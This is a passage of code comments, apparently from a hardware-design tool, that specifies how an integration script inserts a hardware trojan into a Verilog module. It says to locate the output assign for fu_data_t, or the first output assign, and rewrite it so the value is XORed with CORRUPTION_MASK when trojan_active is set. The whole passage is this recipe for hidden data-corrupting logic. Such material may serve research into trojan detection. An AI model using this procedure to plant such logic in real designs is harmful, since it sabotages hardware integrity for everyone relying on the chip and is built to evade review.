...
//
// IMPORTANT: fu_data_t may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If fu_data_t is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for fu_data_t (or first output assign):
//     assign fu_data_t = <expr>;
//   Replace with:
//     assign fu_data_t = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
